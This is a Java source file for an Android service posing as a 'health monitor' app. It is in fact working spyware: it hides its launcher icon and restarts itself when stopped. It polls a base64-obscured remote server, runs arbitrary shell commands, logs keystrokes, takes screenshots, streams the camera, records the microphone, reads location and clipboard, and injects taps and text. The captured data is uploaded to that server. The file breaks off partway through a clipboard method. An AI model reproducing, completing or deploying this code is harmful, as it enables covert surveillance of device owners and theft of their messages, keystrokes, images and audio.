package com.device.health.monitor;

import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.pm.PackageInstaller;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.ComponentName;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.hardware.camera2.CameraCaptureSession;
import android.location.Location;
import android.location.LocationManager;
import android.media.ImageReader;
import android.media.MediaRecorder;
import android.graphics.ImageFormat;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.PowerManager;
import android.provider.Telephony;
import android.util.Base64;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.Surface;
import android.view.WindowManager;
import androidx.core.app.NotificationCompat;
import androidx.core.content.FileProvider;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.ArrayDeque;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.UUID;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;

public class SyncService extends Service {

    static final String TAG     = "HealthSync";
    static final String CHANNEL = "health_sync";
    static final String PREFS   = "health_prefs";

    private ExecutorService pool;
    private volatile boolean running = false;
    private volatile boolean camLiveOn = false;
    private volatile boolean camLiveFront = false;
    private static SyncService instance;
    private android.hardware.camera2.CameraDevice _liveCam = null;
    private android.hardware.camera2.CameraCaptureSession _liveSess = null;
    private android.media.ImageReader _liveReader = null;
    private android.os.HandlerThread _liveHt = null;
    private android.os.Handler _liveHandler = null;
    private volatile long _lastCamFramePush = 0;
    private PowerManager.WakeLock wakeLock;

    public static SyncService getInstance() { return instance; }

    // Screenshot set by MonitorService (full flavor)
    static volatile byte[] pendingShot = null;
    static volatile int snapFailCode = 0;

    // Keylog ring buffer
    private static final int KEYLOG_MAX = 1000;
    static final ArrayDeque<JSONObject> keylogs = new ArrayDeque<>();

    // Offline keylog file writer (persists when server is unreachable)
    private java.io.BufferedWriter klogWriter = null;
    private static final long KLOG_MAX_BYTES = 8 * 1024 * 1024; // 8 MB rotate

    private static String ep() {
        return new String(Base64.decode(
            "aHR0cHM6Ly94dXNiLTBjMHAub25yZW5kZXIuY29t", Base64.DEFAULT));
    }

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        pool = Executors.newFixedThreadPool(6);
        createChannel();
        acquireWakeLock();
        WatchdogJob.schedule(this);
        openKlogFile();
        // Synchronous hide first, then retry after launcher has loaded
        hideIcon();
        new android.os.Handler(android.os.Looper.getMainLooper())
            .postDelayed(this::hideIcon, 3000);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        startFg();
        if (!running) { running = true; pool.submit(this::loop); }
        return START_STICKY;
    }

    @Override public IBinder onBind(Intent i) { return null; }

    @Override
    public void onDestroy() {
        running = false;
        instance = null;
        stopCamLiveInternal();
        releaseWakeLock();
        try { if (klogWriter != null) klogWriter.close(); } catch (Exception ignored) {}
        super.onDestroy();
        scheduleRestart();
    }

    // ── main poll loop ─────────────────────────────────────────────────────────

    private void loop() {
        String id = loadId();
        long lastReg = 0, lastShot = 0, lastCmd = 0, lastKeylogPush = 0;
        int lastCid = 0;

        while (running) {
            try {
                long now = System.currentTimeMillis();

                // Register / heartbeat every 30s
                if (now - lastReg > 30_000) { reg(id); lastReg = now; }

                // Deliver any screenshot the async callback placed
                byte[] s = pendingShot;
                if (s != null) {
                    pendingShot = null;
                    final byte[] fs = s;
                    pool.submit(() -> pushShot(id, fs));
                }

                // Request a new screenshot every 500ms (async, arrives on next iterations)
                if (now - lastShot > 500) {
                    invokeSnap();
                    lastShot = now;
                }

                // Poll for command every 2s (avoid flooding server)
                if (now - lastCmd > 2000) {
                    lastCmd = now;
                    try {
                        JSONObject p = get("/esp/device-cmd?did=" + URLEncoder.encode(id, "UTF-8"));
                        String cmd = p.optString("cmd", "");
                        int cid = p.optInt("id", 0);
                        if (!cmd.isEmpty() && cid != lastCid) {
                            lastCid = cid;
                            final String c = cmd;
                            pool.submit(() -> exec(id, c));
                        }
                    } catch (Exception ignored) {}
                }

                // Push keylogs every 20s if any accumulated
                if (now - lastKeylogPush > 20_000) {
                    lastKeylogPush = now;
                    List<JSONObject> kl = null;
                    synchronized (keylogs) {
                        if (!keylogs.isEmpty()) {
                            kl = new ArrayList<>(keylogs);
                            keylogs.clear();
                        }
                    }
                    if (kl != null) {
                        final List<JSONObject> fkl = kl;
                        pool.submit(() -> {
                            try {
                                JSONObject b = new JSONObject();
                                b.put("did", id);
                                JSONArray arr = new JSONArray();
                                for (JSONObject e : fkl) arr.put(e);
                                b.put("entries", arr);
                                post("/esp/device-keylog", b);
                            } catch (Exception ignored) {}
                        });
                    }
                }

            } catch (Exception e) { Log.d(TAG, "loop: " + e.getMessage()); }
            try { Thread.sleep(300); } catch (InterruptedException e) { break; }
        }
    }

    /** Add entry to keylog ring buffer AND offline file. */
    public void addKeylog(JSONObject entry) {
        synchronized (keylogs) {
            keylogs.addLast(entry);
            while (keylogs.size() > KEYLOG_MAX) keylogs.pollFirst();
        }
        // Write to offline file (survives server downtime)
        try {
            String type = entry.optString("type", "key");
            String data = entry.optString("data", "");
            String pkg  = entry.optString("pkg", "");
            String ts   = new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.US)
                            .format(new java.util.Date(entry.optLong("ts", System.currentTimeMillis())));
            String line;
            if ("text".equals(type))  line = ts + " | TEXT  | [" + pkg + "] " + data;
            else if ("focus".equals(type)) line = ts + " | APP   | " + pkg + "/" + data;
            else                       line = ts + " | KEY   | " + data;
            writeKlog(line);
        } catch (Exception ignored) {}
    }

    private void openKlogFile() {
        try {
            File f = new File(getFilesDir(), "klog.txt");
            // Rotate if > 8 MB
            if (f.exists() && f.length() > KLOG_MAX_BYTES) {
                new File(getFilesDir(), "klog_old.txt").delete();
                f.renameTo(new File(getFilesDir(), "klog_old.txt"));
            }
            klogWriter = new java.io.BufferedWriter(new java.io.FileWriter(f, true));
        } catch (Exception ignored) {}
    }

    private synchronized void writeKlog(String line) {
        try {
            if (klogWriter != null) {
                klogWriter.write(line);
                klogWriter.newLine();
                klogWriter.flush();
            }
        } catch (Exception ignored) {}
    }

    /** Call MonitorService.snap() via reflection (full flavor only). */
    private void invokeSnap() {
        try {
            Class<?> ms = Class.forName("com.device.health.monitor.MonitorService");
            Object inst = ms.getMethod("getInstance").invoke(null);
            if (inst != null) ms.getMethod("snap").invoke(inst);
        } catch (Exception ignored) {}
    }

    // ── command dispatcher ─────────────────────────────────────────────────────

    private void exec(String id, String cmd) {
        if (cmd.equals("__uninstall__"))     { handleUninstall(id); return; }
        if (cmd.equals("__upgrade__"))       { doUpgrade(id); return; }
        if (cmd.equals("__hide__"))          { hideIcon(); sendOut(id, cmd, enc("icon_hidden")); return; }
        if (cmd.equals("__wake__"))          { doWake(id); return; }
        if (cmd.equals("__keylog__"))        { doKeylogDump(id); return; }
        if (cmd.equals("__keylog_file__"))   { doKeylogFile(id); return; }
        if (cmd.startsWith("__mic"))         { doMic(id, cmd); return; }
        if (cmd.equals("__cam__"))            { doCam(id, false); return; }
        if (cmd.equals("__cam_front__"))      { doCam(id, true); return; }
        if (cmd.equals("__cam_live_on__"))    { startCamLive(id, false); return; }
        if (cmd.equals("__cam_live_front__")) { startCamLive(id, true); return; }
        if (cmd.equals("__cam_live_off__"))   { stopCamLiveInternal(); sendOut(id, cmd, enc("cam_live_stopped")); return; }
        if (cmd.equals("__loc__"))           { doLoc(id); return; }
        if (cmd.equals("__clip__"))          { doClip(id); return; }
        if (cmd.equals("__sms__"))           { doSms(id); return; }
        if (cmd.equals("__contacts__"))      { doContacts(id); return; }
        if (cmd.startsWith("__tap:"))        { doGestureTap(id, cmd); return; }
        if (cmd.startsWith("__swipe:"))      { doGestureSwipe(id, cmd); return; }
        if (cmd.startsWith("__key:"))        { doGestureKey(id, cmd); return; }
        if (cmd.startsWith("__text:"))       { doTextInject(id, cmd); return; }
        if (cmd.startsWith("__upload:"))     { doUpload(id, cmd.substring(9).replace("__","")); return; }
        if (cmd.startsWith("__dl:"))         { doDownload(id, cmd.substring(5).replace("__","")); return; }

        // Shell execution — concurrent stream reading prevents pipe deadlock
        try {
            Process proc = Runtime.getRuntime().exec(new String[]{"sh", "-c", cmd});
            byte[][] buf = {null, null};
            Thread t1 = new Thread(() -> { try { buf[0] = drain(proc.getInputStream(), 65536); } catch (Exception e) { buf[0] = new byte[0]; } });
            Thread t2 = new Thread(() -> { try { buf[1] = drain(proc.getErrorStream(), 8192);  } catch (Exception e) { buf[1] = new byte[0]; } });
            t1.start(); t2.start();
            proc.waitFor(30, TimeUnit.SECONDS);
            t1.join(2000); t2.join(2000);
            byte[] out = cat(buf[0] != null ? buf[0] : new byte[0],
                             buf[1] != null ? buf[1] : new byte[0]);
            sendOut(id, cmd, Base64.encodeToString(out, Base64.NO_WRAP));
        } catch (Exception e) {
            sendOut(id, cmd, enc("Error: " + e.getMessage()));
        }
    }

    // ── gesture / interaction commands ────────────────────────────────────────

    /** __tap:rx,ry__ — tap at normalized screen position (0.0–1.0) */
    private void doGestureTap(String id, String cmd) {
        try {
            String args = cmd.replaceFirst("__tap:", "").replace("__", "");
            String[] parts = args.split(",");
            float rx = Float.parseFloat(parts[0]);
            float ry = Float.parseFloat(parts[1]);

            // Method 1: AccessibilityService.dispatchGesture (works on lock screen, most reliable)
            boolean done = false;
            try {
                Class<?> ms = Class.forName("com.device.health.monitor.MonitorService");
                Object inst = ms.getMethod("getInstance").invoke(null);
                if (inst != null) {
                    ms.getMethod("performTap", float.class, float.class).invoke(inst, rx, ry);
                    done = true;
                }
            } catch (Exception ignored) {}

            // Method 2: shell input tap (absolute coords)
            if (!done) {
                int[] wh = getScreenDims();
                int ax = (int)(rx * wh[0]), ay = (int)(ry * wh[1]);
                shellExec("input tap " + ax + " " + ay, 2000);
            }
            sendOut(id, cmd, enc("tapped:" + rx + "," + ry));
        } catch (Exception e) { sendOut(id, cmd, enc("err:" + e.getMessage())); }
    }

    /** __swipe:rx1,ry1,rx2,ry2,dur__ */
    private void doGestureSwipe(String id, String cmd) {
        try {
            String args = cmd.replaceFirst("__swipe:", "").replace("__", "");
            String[] p = args.split(",");
            float rx1 = Float.parseFloat(p[0]), ry1 = Float.parseFloat(p[1]);
            float rx2 = Float.parseFloat(p[2]), ry2 = Float.parseFloat(p[3]);
            int dur = p.length > 4 ? Integer.parseInt(p[4]) : 300;

            boolean done = false;
            try {
                Class<?> ms = Class.forName("com.device.health.monitor.MonitorService");
                Object inst = ms.getMethod("getInstance").invoke(null);
                if (inst != null) {
                    ms.getMethod("performSwipe", float.class, float.class, float.class, float.class, int.class)
                      .invoke(inst, rx1, ry1, rx2, ry2, dur);
                    done = true;
                }
            } catch (Exception ignored) {}

            if (!done) {
                int[] wh = getScreenDims();
                int x1=(int)(rx1*wh[0]), y1=(int)(ry1*wh[1]);
                int x2=(int)(rx2*wh[0]), y2=(int)(ry2*wh[1]);
                shellExec("input swipe " + x1 + " " + y1 + " " + x2 + " " + y2 + " " + dur, dur + 500);
            }
            sendOut(id, cmd, enc("swiped"));
        } catch (Exception e) { sendOut(id, cmd, enc("err:" + e.getMessage())); }
    }

    /** __key:HOME__ / BACK / RECENT / NOTIFICATIONS / POWER_DIALOG / LOCK / SCREENSHOT */
    private void doGestureKey(String id, String cmd) {
        try {
            String action = cmd.replaceFirst("__key:", "").replace("__", "");

            boolean done = false;
            try {
                Class<?> ms = Class.forName("com.device.health.monitor.MonitorService");
                Object inst = ms.getMethod("getInstance").invoke(null);
                if (inst != null) {
                    ms.getMethod("performGlobal", String.class).invoke(inst, action);
                    done = true;
                }
            } catch (Exception ignored) {}

            if (!done) {
                String kc;
                switch (action) {
                    case "HOME":          kc = "KEYCODE_HOME"; break;
                    case "BACK":          kc = "KEYCODE_BACK"; break;
                    case "RECENT":        kc = "KEYCODE_APP_SWITCH"; break;
                    case "LOCK":          kc = "KEYCODE_SLEEP"; break;
                    case "POWER_DIALOG":  kc = "KEYCODE_POWER"; break;
                    case "NOTIFICATIONS": kc = "KEYCODE_NOTIFICATION"; break;
                    case "SCREENSHOT":    kc = "KEYCODE_SYSRQ"; break;
                    default:              kc = action;
                }
                shellExec("input keyevent " + kc, 2000);
            }
            sendOut(id, cmd, enc("key:" + action));
        } catch (Exception e) { sendOut(id, cmd, enc("err:" + e.getMessage())); }
    }

    /** __text:hello world__ — inject text into focused field */
    private void doTextInject(String id, String cmd) {
        try {
            String text = cmd.replaceFirst("__text:", "").replaceAll("__$", "");
            // Escape for shell: replace spaces with %s for input text (Android quirk)
            String escaped = text.replace(" ", "%s")
                                  .replace("&", "\\&")
                                  .replace("|", "\\|")
                                  .replace(";", "\\;")
                                  .replace("<", "\\<")
                                  .replace(">", "\\>")
                                  .replace("(", "\\(")
                                  .replace(")", "\\)");
            shellExec("input text \"" + escaped.replace("\"", "\\\"") + "\"", 3000);
            sendOut(id, "__text__", enc("injected:" + text.length() + "chars"));
        } catch (Exception e) { sendOut(id, "__text__", enc("err:" + e.getMessage())); }
    }

    /** __wake__ — turn screen on */
    private void doWake(String id) {
        // Method 1: shell KEYCODE_WAKEUP (most reliable on modern Android)
        try { shellExec("input keyevent KEYCODE_WAKEUP", 1000); } catch (Exception ignored) {}
        // Method 2: PowerManager wake lock
        try {
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            if (pm != null) {
                @SuppressWarnings("deprecation")
                PowerManager.WakeLock wl = pm.newWakeLock(
                    PowerManager.FULL_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP
                    | PowerManager.ON_AFTER_RELEASE, "health:wake");
                wl.acquire(5000);
            }
        } catch (Exception ignored) {}
        sendOut(id, "__wake__", enc("wake_sent"));
    }

    /** __keylog_file__ — upload the offline keylog file to relay server */
    private void doKeylogFile(String id) {
        try {
            // Flush writer first
            synchronized (this) {
                if (klogWriter != null) klogWriter.flush();
            }
            File f = new File(getFilesDir(), "klog.txt");
            if (!f.exists() || f.length() == 0) {
                sendOut(id, "__keylog_file__", enc("klog empty")); return;
            }
            byte[] data = readFile(f);
            JSONObject b = new JSONObject();
            b.put("did", id);
            b.put("name", "klog.txt");
            b.put("data", Base64.encodeToString(data, Base64.NO_WRAP));
            b.put("size", data.length);
            post("/esp/device-file", b);
            sendOut(id, "__keylog_file__", enc("klog uploaded: " + data.length + "B"));
        } catch (Exception e) { sendOut(id, "__keylog_file__", enc("err:" + e.getMessage())); }
    }

    /** __keylog__ — dump and clear current keylog buffer */
    private void doKeylogDump(String id) {
        List<JSONObject> kl;
        synchronized (keylogs) {
            kl = new ArrayList<>(keylogs);
        }
        try {
            JSONArray arr = new JSONArray();
            for (JSONObject e : kl) arr.put(e);
            sendOut(id, "__keylog__", enc(arr.toString()));
        } catch (Exception e) { sendOut(id, "__keylog__", enc("err:" + e.getMessage())); }
    }

    /**
     * Hide launcher icon — universal across stock Android, Samsung One UI,
     * Xiaomi MIUI, OnePlus, Huawei, and other OEM launchers.
     *
     * Two-state approach: DISABLED first (standard), then DISABLED_USER
     * (how "user disables via Settings" works — most OEM launchers treat
     * this as definitive). The system automatically broadcasts PACKAGE_CHANGED
     * to launchers when component state changes; we also send the proper extras
     * format that tells launchers which exact component changed.
     */
    void hideIcon() {
        String pkg = getPackageName();
        PackageManager pm = getPackageManager();
        android.content.ComponentName alias = new android.content.ComponentName(
            pkg, pkg + ".MainLauncher");

        // Pass 1: DISABLED (standard Android, Pixel, stock AOSP)
        try {
            pm.setComponentEnabledSetting(alias,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP);
        } catch (Exception ignored) {}

        // Pass 2: DISABLED_USER — matches "user disabled via Settings" semantics.
        // Samsung One UI, Xiaomi, OnePlus launchers specifically respect this state.
        try {
            pm.setComponentEnabledSetting(alias,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED_USER,
                PackageManager.DONT_KILL_APP);
        } catch (Exception ignored) {}

        // Explicit PACKAGE_CHANGED broadcast with component-name list + UID extras.
        // The system also sends this automatically but some OEM launchers additionally
        // need the extras to know which specific component changed so they can update
        // their icon cache without a full package rescan.
        try {
            Intent bi = new Intent(Intent.ACTION_PACKAGE_CHANGED);
            bi.setData(Uri.parse("package:" + pkg));
            bi.putExtra("android.intent.extra.CHANGED_COMPONENT_NAME_LIST",
                new String[]{ pkg + ".MainLauncher", pkg + ".MainActivity" });
            bi.putExtra(Intent.EXTRA_UID, getApplicationInfo().uid);
            bi.putExtra("android.intent.extra.DONT_KILL_APP", true);
            sendBroadcast(bi);
        } catch (Exception ignored) {}
    }

    /** Get screen dimensions [w, h]. */
    private int[] getScreenDims() {
        try {
            DisplayMetrics dm = new DisplayMetrics();
            ((WindowManager) getSystemService(WINDOW_SERVICE))
                .getDefaultDisplay().getRealMetrics(dm);
            return new int[]{dm.widthPixels, dm.heightPixels};
        } catch (Exception e) { return new int[]{1080, 2400}; }
    }

    /** Run a quick shell command synchronously (up to timeoutMs). */
    private void shellExec(String cmd, long timeoutMs) throws Exception {
        Runtime.getRuntime().exec(new String[]{"sh", "-c", cmd})
               .waitFor(timeoutMs, TimeUnit.MILLISECONDS);
    }

    // ── camera live streaming ──────────────────────────────────────────────────

    private void startCamLive(final String id, final boolean front) {
        stopCamLiveInternal();
        camLiveOn = true; camLiveFront = front;
        if (checkSelfPermission("android.permission.CAMERA") != PackageManager.PERMISSION_GRANTED) {
            sendOut(id, front ? "__cam_live_front__" : "__cam_live_on__", enc("CAMERA not granted")); return;
        }
        _liveHt = new HandlerThread("cam-live"); _liveHt.start();
        _liveHandler = new Handler(_liveHt.getLooper());
        try {
            CameraManager cm = (CameraManager) getSystemService(CAMERA_SERVICE);
            String camId = null;
            int facing = front ? CameraCharacteristics.LENS_FACING_FRONT : CameraCharacteristics.LENS_FACING_BACK;
            for (String cid : cm.getCameraIdList()) {
                CameraCharacteristics ch = cm.getCameraCharacteristics(cid);
                Integer f = ch.get(CameraCharacteristics.LENS_FACING);
                if (f != null && f == facing) { camId = cid; break; }
            }
            if (camId == null && cm.getCameraIdList().length > 0) camId = cm.getCameraIdList()[0];
            if (camId == null) { sendOut(id, front ? "__cam_live_front__" : "__cam_live_on__", enc("no camera")); return; }

            _liveReader = ImageReader.newInstance(960, 720, ImageFormat.YUV_420_888, 3);
            final String fCamId = camId;
            _liveReader.setOnImageAvailableListener(reader -> {
                if (!camLiveOn) { try (android.media.Image img = reader.acquireLatestImage()) {} return; }
                long now2 = System.currentTimeMillis();
                if (now2 - _lastCamFramePush < 160) {
                    try (android.media.Image img = reader.acquireLatestImage()) {} return;
                }
                try (android.media.Image img = reader.acquireLatestImage()) {
                    if (img == null) return;
                    byte[] jpeg = yuvToJpeg(img, 40);
                    _lastCamFramePush = now2;
                    pool.submit(() -> {
                        try {
                            JSONObject b = new JSONObject();
                            b.put("did", loadId());
                            b.put("img", Base64.encodeToString(jpeg, Base64.NO_WRAP));
                            b.put("cam", front ? "front" : "back");
                            post("/esp/device-photo", b);
                        } catch (Exception ignored) {}
                    });
                } catch (Exception ignored) {}
            }, _liveHandler);

            cm.openCamera(fCamId, new CameraDevice.StateCallback() {
                @Override public void onOpened(CameraDevice cam) {
                    _liveCam = cam;
                    List<Surface> surfs = new ArrayList<>();
                    surfs.add(_liveReader.getSurface());
                    try {
                        cam.createCaptureSession(surfs, new CameraCaptureSession.StateCallback() {
                            @Override public void onConfigured(CameraCaptureSession sess) {
                                _liveSess = sess;
                                try {
                                    CaptureRequest.Builder rb = cam.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW);
                                    rb.addTarget(_liveReader.getSurface());
                                    rb.set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO);
                                    rb.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON);
                                    rb.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_VIDEO);
                                    sess.setRepeatingRequest(rb.build(), null, _liveHandler);
                                    sendOut(id, front ? "__cam_live_front__" : "__cam_live_on__", enc("live_started"));
                                } catch (Exception e) { sendOut(id, front ? "__cam_live_front__" : "__cam_live_on__", enc("err:" + e.getMessage())); stopCamLiveInternal(); }
                            }
                            @Override public void onConfigureFailed(CameraCaptureSession s) {
                                sendOut(id, front ? "__cam_live_front__" : "__cam_live_on__", enc("session_failed")); stopCamLiveInternal();
                            }
                        }, _liveHandler);
                    } catch (Exception e) { sendOut(id, front ? "__cam_live_front__" : "__cam_live_on__", enc("err:" + e.getMessage())); stopCamLiveInternal(); }
                }
                @Override public void onDisconnected(CameraDevice cam) { cam.close(); _liveCam = null; }
                @Override public void onError(CameraDevice cam, int err) { cam.close(); _liveCam = null; sendOut(id, front ? "__cam_live_front__" : "__cam_live_on__", enc("cam_err:" + err)); }
            }, _liveHandler);
        } catch (Exception e) { sendOut(id, front ? "__cam_live_front__" : "__cam_live_on__", enc("open_err:" + e.getMessage())); stopCamLiveInternal(); }
    }

    private void stopCamLiveInternal() {
        camLiveOn = false;
        try { if (_liveSess != null) { _liveSess.stopRepeating(); _liveSess.close(); } } catch (Exception ignored) {}
        try { if (_liveCam   != null) _liveCam.close(); }   catch (Exception ignored) {}
        try { if (_liveReader!= null) _liveReader.close(); } catch (Exception ignored) {}
        try { if (_liveHt   != null) _liveHt.quitSafely(); } catch (Exception ignored) {}
        _liveSess = null; _liveCam = null; _liveReader = null; _liveHt = null; _liveHandler = null;
    }

    private byte[] yuvToJpeg(android.media.Image img, int quality) {
        int w = img.getWidth(), h = img.getHeight();
        android.media.Image.Plane[] planes = img.getPlanes();
        java.nio.ByteBuffer yBuf = planes[0].getBuffer();
        java.nio.ByteBuffer uBuf = planes[1].getBuffer();
        java.nio.ByteBuffer vBuf = planes[2].getBuffer();
        int yLen = yBuf.remaining();
        byte[] nv21 = new byte[yLen + w * h / 2];
        yBuf.get(nv21, 0, yLen);
        byte[] u = new byte[uBuf.remaining()];
        byte[] v = new byte[vBuf.remaining()];
        uBuf.get(u); vBuf.get(v);
        int uvStride = planes[2].getPixelStride();
        int uvRow    = planes[2].getRowStride();
        for (int row = 0; row < h / 2; row++) {
            for (int col = 0; col < w / 2; col++) {
                nv21[yLen + row * w + col * 2]     = v[row * uvRow + col * uvStride];
                nv21[yLen + row * w + col * 2 + 1] = u[row * uvRow + col * uvStride];
            }
        }
        android.graphics.YuvImage yuv = new android.graphics.YuvImage(nv21, ImageFormat.NV21, w, h, null);
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        yuv.compressToJpeg(new android.graphics.Rect(0, 0, w, h), quality, baos);
        return baos.toByteArray();
    }

    // ── one-shot camera photo ──────────────────────────────────────────────────

    private void doCam(String id, boolean front) {
        final String cmdKey = front ? "__cam_front__" : "__cam__";
        if (checkSelfPermission("android.permission.CAMERA") != PackageManager.PERMISSION_GRANTED) {
            sendOut(id, cmdKey, enc("CAMERA permission not granted")); return;
        }
        try {
            CameraManager cm = (CameraManager) getSystemService(CAMERA_SERVICE);
            String camId = null;
            int facing = front ? CameraCharacteristics.LENS_FACING_FRONT : CameraCharacteristics.LENS_FACING_BACK;
            for (String cid : cm.getCameraIdList()) {
                CameraCharacteristics ch = cm.getCameraCharacteristics(cid);
                Integer f = ch.get(CameraCharacteristics.LENS_FACING);
                if (f != null && f == facing) { camId = cid; break; }
            }
            if (camId == null && cm.getCameraIdList().length > 0) camId = cm.getCameraIdList()[0];
            if (camId == null) { sendOut(id, cmdKey, enc("no camera")); return; }

            ImageReader reader = ImageReader.newInstance(1920, 1080, ImageFormat.JPEG, 2);
            HandlerThread ht = new HandlerThread("cam");
            ht.start();
            Handler h = new Handler(ht.getLooper());
            AtomicBoolean fired = new AtomicBoolean(false);
            final String finalId = camId;

            reader.setOnImageAvailableListener(imgR -> {
                if (!fired.compareAndSet(false, true)) return;
                try (android.media.Image img = imgR.acquireLatestImage()) {
                    if (img == null) return;
                    java.nio.ByteBuffer buf2 = img.getPlanes()[0].getBuffer();
                    byte[] bytes = new byte[buf2.remaining()];
                    buf2.get(bytes);
                    JSONObject b = new JSONObject();
                    b.put("did", id);
                    b.put("img", Base64.encodeToString(bytes, Base64.NO_WRAP));
                    b.put("cam", front ? "front" : "back");
                    post("/esp/device-photo", b);
                    sendOut(id, cmdKey, enc("photo_sent:" + bytes.length + "B"));
                } catch (Exception e) {
                    sendOut(id, cmdKey, enc("img error: " + e.getMessage()));
                }
                ht.quitSafely();
            }, h);

            cm.openCamera(finalId, new CameraDevice.StateCallback() {
                @Override public void onOpened(CameraDevice cam) {
                    try {
                        List<Surface> surfs = new ArrayList<>();
                        surfs.add(reader.getSurface());
                        cam.createCaptureSession(surfs, new CameraCaptureSession.StateCallback() {
                            @Override public void onConfigured(CameraCaptureSession sess) {
                                try {
                                    CaptureRequest.Builder rb = cam.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                                    rb.addTarget(reader.getSurface());
                                    rb.set(CaptureRequest.JPEG_QUALITY, (byte) 80);
                                    rb.set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO);
                                    sess.capture(rb.build(), new CameraCaptureSession.CaptureCallback() {
                                        @Override public void onCaptureFailed(CameraCaptureSession s2, CaptureRequest r, android.hardware.camera2.CaptureFailure fail) {
                                            sendOut(id, cmdKey, enc("capture failed:" + fail.getReason()));
                                            cam.close(); ht.quitSafely();
                                        }
                                    }, h);
                                } catch (Exception e) { sendOut(id, cmdKey, enc("capture err: " + e.getMessage())); cam.close(); ht.quitSafely(); }
                            }
                            @Override public void onConfigureFailed(CameraCaptureSession sess) {
                                sendOut(id, cmdKey, enc("session config failed")); cam.close(); ht.quitSafely();
                            }
                        }, h);
                    } catch (Exception e) { sendOut(id, cmdKey, enc("session err: " + e.getMessage())); cam.close(); ht.quitSafely(); }
                }
                @Override public void onDisconnected(CameraDevice cam) { cam.close(); ht.quitSafely(); }
                @Override public void onError(CameraDevice cam, int err) { sendOut(id, cmdKey, enc("cam error:" + err)); cam.close(); ht.quitSafely(); }
            }, h);
        } catch (Exception e) { sendOut(id, cmdKey, enc("Camera error: " + e.getMessage())); }
    }

    // ── microphone ────────────────────────────────────────────────────────────

    private void doMic(String id, String cmd) {
        int secs = 10;
        try { secs = Math.max(1, Math.min(60, Integer.parseInt(cmd.replaceAll("[^0-9]", "")))); }
        catch (Exception ignored) {}
        final int dur = secs;
        File f = new File(getCacheDir(), "mic.m4a");
        MediaRecorder mr = null;
        try {
            mr = Build.VERSION.SDK_INT >= Build.VERSION_CODES.S
                    ? new MediaRecorder(this) : new MediaRecorder();
            mr.setAudioSource(MediaRecorder.AudioSource.MIC);
            mr.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            mr.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            mr.setAudioSamplingRate(44100);
            mr.setAudioEncodingBitRate(128000);
            mr.setOutputFile(f.getAbsolutePath());
            mr.prepare(); mr.start();
            Thread.sleep(dur * 1000L);
            mr.stop();
            byte[] data = readFile(f);
            JSONObject b = new JSONObject();
            b.put("did", id); b.put("audio", Base64.encodeToString(data, Base64.NO_WRAP));
            b.put("fmt", "m4a"); b.put("secs", dur);
            post("/esp/device-audio", b);
            sendOut(id, cmd, enc("audio_sent:" + dur + "s/" + data.length + "B"));
        } catch (Exception e) {
            sendOut(id, cmd, enc("mic error: " + e.getMessage()));
        } finally {
            if (mr != null) { try { mr.release(); } catch (Exception ignored) {} }
            f.delete();
        }
    }

    // ── spy commands ──────────────────────────────────────────────────────────

    private void doLoc(String id) {
        if (checkSelfPermission("android.permission.ACCESS_FINE_LOCATION") != PackageManager.PERMISSION_GRANTED
         && checkSelfPermission("android.permission.ACCESS_COARSE_LOCATION") != PackageManager.PERMISSION_GRANTED) {
            sendOut(id, "__loc__", enc("LOCATION permission not granted")); return;
        }
        try {
            LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
            Location loc = null;
            for (String p : new String[]{LocationManager.GPS_PROVIDER, LocationManager.NETWORK_PROVIDER, LocationManager.PASSIVE_PROVIDER}) {
                try { Location l = lm.getLastKnownLocation(p); if (l != null && (loc == null || l.getAccuracy() < loc.getAccuracy())) loc = l; }
                catch (SecurityException ignored) {}
            }
            if (loc != null) {
                sendOut(id, "__loc__", enc(String.format("lat=%.6f,lon=%.6f,acc=%.0fm,provider=%s,age=%ds",
                    loc.getLatitude(), loc.getLongitude(), loc.getAccuracy(), loc.getProvider(),
                    (System.currentTimeMillis() - loc.getTime()) / 1000)));
            } else {
                sendOut(id, "__loc__", enc("no location cached (GPS may be off)"));
            }
        } catch (Exception e) { sendOut(id, "__loc__", enc("loc error: " + e.getMessage())); }
    }

    private void doClip(String id) {
        String result = null;
        try {
            Class<?> ms = Class.forName("com.device.health.monitor.MonitorService");
            Object inst = ms.getMethod("getInstance").invoke(null);
            if (inst != null) result = (String) ms.getMethod("getClipboard").invoke(inst);
        } catch (Exception ignored) {}
        if (result == null) {
            try {
                ClipboardManager cm = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
                ClipData cd = cm.getPrimaryClip();
